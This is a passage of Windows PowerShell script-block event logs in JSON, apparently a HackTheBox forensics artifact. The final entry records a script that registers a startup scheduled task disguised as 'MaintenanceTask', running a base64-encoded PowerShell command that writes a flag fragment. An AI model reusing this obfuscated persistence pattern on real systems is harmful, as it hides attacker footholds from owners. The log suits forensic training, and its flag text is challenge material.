  End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Unregister-ClusteredScheduledTask' -Alias '*'\r\n        \r\n",
    "ScriptBlockId": "d312e26e-f2a9-4ba0-95bc-bdbc730b6055",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.498797Z"
    },
    "EventRecordID": 95,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-67A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "function __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}",
    "ScriptBlockId": "fc2ef06e-46be-488d-8164-298b6ab163a9",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:25.668272Z"
    },
    "EventRecordID": 96,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-6BA3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "$global:?",
    "ScriptBlockId": "5d5c2f43-c08a-47b1-ae08-76f52a9d35ea",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:17.415656Z"
    },
    "EventRecordID": 22,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0003-3BA0-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Get-ChildItem -Path \"$env:TEMP\" -Verbose\nGet-Process -Verbose\n\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-EncodedCommand JHRlbXBQYXRoID0gIiRlbnY6d2luZGlyXHRlbXBcR2gwc3QudHh0IgoiSFRCe0doMHN0X0wwYzR0MTBuIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkdGVtcFBhdGggLUVuY29kaW5nIHV0Zjg=\"\n$trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName \"MaintenanceTask\" -Description \"\"\n",
    "ScriptBlockId": "677529ad-da67-4f73-a7b3-b3385eaed86b",
    "Path": "C:\\Users\\usr01\\AppData\\Local\\Temp\\wLDwomPJLN.ps1"
  }
}
